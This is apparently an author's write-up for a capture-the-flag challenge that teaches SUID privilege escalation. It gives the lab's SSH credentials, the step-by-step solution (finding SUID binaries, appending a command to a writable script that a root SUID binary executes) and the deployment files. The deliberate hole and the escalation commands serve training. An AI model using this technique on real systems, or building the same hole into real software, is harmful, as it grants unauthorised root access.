# suid-report writeup (for author)

## Purpose
Train SUID abuse via a root SUID binary that executes a writable script.

## Access
- SSH: user `ctf`, pass `ctf123`
- CTFd shows `ssh ctf@ip -p port`

## Intended path
1) Find SUID binaries:
```
find / -type f -perm -4000 2>/dev/null
```
2) Note `/usr/local/bin/run_report`.
3) Discover it runs `/opt/ctf/bin/report.sh` (strings/ls):
```
strings /usr/local/bin/run_report
ls -l /opt/ctf/bin/report.sh
```
4) Append payload to readable output:
```
echo 'cat /root/flag.txt > /home/ctf/flag.txt' >> /opt/ctf/bin/report.sh
```
5) Execute SUID binary:
```
/usr/local/bin/run_report
```
6) Read flag:
```
cat /home/ctf/flag.txt
```

## Flag location
- Real flag is stored in `/root/flag.txt` (root-only).

## Hardening notes
- `sudo` removed.
- `su` locked down.
- All other SUID bits stripped except `/usr/local/bin/run_report`.

## Files (prod)
- `ctfd/Dockerfile`
- `ctfd/entrypoint.sh`
- `ctfd/docker-compose.yml`
- `ctfd/run_report.c`

## Files (test)
- `test/Dockerfile`
- `test/entrypoint.sh`
- `test/docker-compose.yml`
- `test/run_report.c`

## What to change before prod
- Replace `FLAG` value in CTFd config (platform will inject).
- Update `CTF_USER`/`CTF_PASS` if needed.
- Optional: update MOTD/WELCOME hints in `entrypoint.sh`.
